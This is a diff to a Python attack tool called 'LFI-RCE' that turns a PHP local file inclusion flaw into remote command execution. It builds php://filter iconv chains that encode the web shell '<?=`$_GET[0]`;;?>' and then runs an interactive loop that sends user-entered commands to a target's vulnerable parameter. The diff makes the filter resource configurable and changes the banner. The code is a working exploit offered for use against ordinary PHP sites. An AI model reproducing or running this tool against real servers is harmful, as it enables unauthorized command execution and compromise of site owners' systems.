@@ -2,10 +2,12 @@ from bs4 import BeautifulSoup
 import webbrowser
 import requests
 import base64
+import pyfiglet
+import random
 
 #Tool Link: https://github.com/jameel3reef/mrAlphaQ/blob/main/Tools/LFI-RCE.py
 
-def chain(base64_payload):
+def chain(base64_payload, resource):
     conversions = {
         '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
         '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
@@ -86,15 +88,15 @@ def chain(base64_payload):
 
     filters += "convert.base64-decode"
 
-    final_payload = f"php://filter/{filters}/resource=php://temp"
+    final_payload = f"php://filter/{filters}/resource={resource}"
     return final_payload
 
-def RCE(url,vulnerable_parameter):
+def RCE(url, vulnerable_parameter, resource):
     regular_payload="<?=`$_GET[0]`;;?>"
     base64_payload = base64.b64encode(regular_payload.encode()).decode()
     if base64_payload.endswith('='):
             base64_payload = base64_payload[:-1]
-    final_payload = chain(base64_payload)
+    final_payload = chain(base64_payload, resource)
     while True:
         command = input("Enter a command $ ")
         if command.lower() == "exit":
@@ -107,12 +109,12 @@ def RCE(url,vulnerable_parameter):
             })
             print(r.text.encode('ascii', 'ignore').decode('ascii'))
 
-def PHP_info(url,vulnerable_parameter):
+def PHP_info(url, vulnerable_parameter, resource):
     regular_payload="<?php phpinfo();?>"
     base64_payload = base64.b64encode(regular_payload.encode()).decode()
     if base64_payload.endswith('='):
         base64_payload = base64_payload[:-1]
-    final_payload = chain(base64_payload)
+    final_payload = chain(base64_payload, resource)
     while True:
         choice = input("Please choose:\n1- print the output in the terminal\n2- open in browser\nYour Choice: ")
         if choice == "1":
@@ -133,16 +135,15 @@ def PHP_info(url,vulnerable_parameter):
 def main():
     url = input("Enter the URL 'ex: (http://example.com/)': ")
     vulnerable_parameter = input("Enter the vulnerable parameter: ")
-    if not url.endswith('/'):
-        url+="/"
+    resource = input("Enter the resource 'default (php://temp)':")or "php://temp"
 
     while True:
-        choice = input("Please choose:\n1- Remote Command Excution\n2- PHP Info\n3- Exit\nYour Choice: ")
+        choice = input("Please choose:\n1- Remote Command Execution\n2- PHP Info\n3- Exit\nYour Choice: ")
         if choice == "1":
-            RCE(url,vulnerable_parameter)
+            RCE(url, vulnerable_parameter, resource)
             break
         elif choice == "2":
-            PHP_info(url,vulnerable_parameter)
+            PHP_info(url, vulnerable_parameter, resource)
         elif choice == "3":
             print("\nGoodbye!")
             exit(0)
@@ -152,15 +153,10 @@ def main():
 
 if __name__ == "__main__":
     try:
-        print(''' 
-         _____     ________  _____             _______       ______  ________  
-        |_   _|   |_   __  ||_   _|           |_   __ \    .' ___  ||_   __  | 
-          | |       | |_ \_|  | |  ____________ | |__) |  / .'   \_|  | |_ \_| 
-          | |   _   |  _|     | | |By: mrAlphaQ |  __ /   | |         |  _| _  
-         _| |__/ | _| |_     _| |_             _| |  \ \_ \ `.___.'\ _| |__/ | 
-        |________||_____|   |_____|           |____| |___| `.____ .'|________|  
-                                                                     
-        ''')
+        text = pyfiglet.Figlet(font=random.choice(pyfiglet.FigletFont.getFonts()))
+        ascii_art = text.renderText('LFI-RCE')
+        # Print the ASCII art
+        print("\n"+ascii_art+"\nBy: mrAlphaQ\n")
         main()
     except KeyboardInterrupt:
         print("\nGoodbye!")
